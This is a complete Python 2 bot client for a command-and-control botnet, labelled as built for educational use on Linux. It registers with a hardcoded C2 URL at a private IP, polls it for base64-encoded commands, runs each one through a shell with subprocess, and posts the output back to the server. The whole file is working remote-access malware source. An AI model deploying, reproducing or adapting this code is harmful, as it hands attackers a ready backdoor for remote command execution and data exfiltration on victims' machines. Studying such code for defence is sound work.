#!/usr/bin/python
# Building this bot to only work with linux
# Built for educational use only...

import base64
import hashlib
import random
import datetime
import urllib
import urllib2
import time
import subprocess

c2server="http://172.16.216.132/view.php"
sleepTime = 10	# Sleep for 10 seconds between requests going to the c2server

def generateMachineID():
	# This function generates a random machine ID based on the time and a random number
	machineID = str(datetime.datetime.now()) + str(random.randint(1,10000))	
	machineID = hashlib.sha1(machineID).hexdigest() # Will return as machineID
	return machineID

def addBot(mID):
	# This function adds the bot to the C2Servers SQLite3 database
	url = c2server + "?action=addBot&mID=" + mID
	urllib2.urlopen(url).read()

def getCommand(mID):
	# This function gets the next command from the C2 to execute
	url = c2server + "?action=getCommand&mID=" + mID
	u = urllib2.urlopen(url)
	i = u.read()
	info = i.split("|")
	print "Received - Task ID: " + info[0] + "\tCommand: " + base64.b64decode(info[1])
	return info[0], info[1]

def execCommand(c):
	# This function takes the command it received and eecutes it
	c = base64.b64decode(c)
	comExec = subprocess.Popen(str(c), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
	STDOUT, STDERR = comExec.communicate()
	if STDOUT:
		encodedOutput = base64.b64encode(STDOUT)
	else:
		encodedOutput = base64.b64encode("Invalid Command...")
	return encodedOutput

def postCommand(mID, tID, r):
	# This function returns to the c2server the results of the command
	url = c2server
	data = urllib.urlencode({'action' : 'postCommand',
				 'mID' : mID,
				 'id' : tID,
				 'httpResults' : r})
	u = urllib2.urlopen(url=url, data=data)

def main():
	machineID = generateMachineID() # Generate a random machine identifier
	addBot(machineID)		# Communicate to the C2 Server and Add this bot
	while True:			# Don't exit until program fails
		time.sleep(sleepTime)	# Wait for the specified time 
		taskID, command = getCommand(machineID)	
		if base64.b64decode(command)=='Nothing':
			time.sleep(sleepTime*3)
		else:
			time.sleep(sleepTime)
			results = execCommand(command)
			time.sleep(sleepTime)
			postCommand(machineID, taskID, results)

if __name__ == "__main__":
	main()
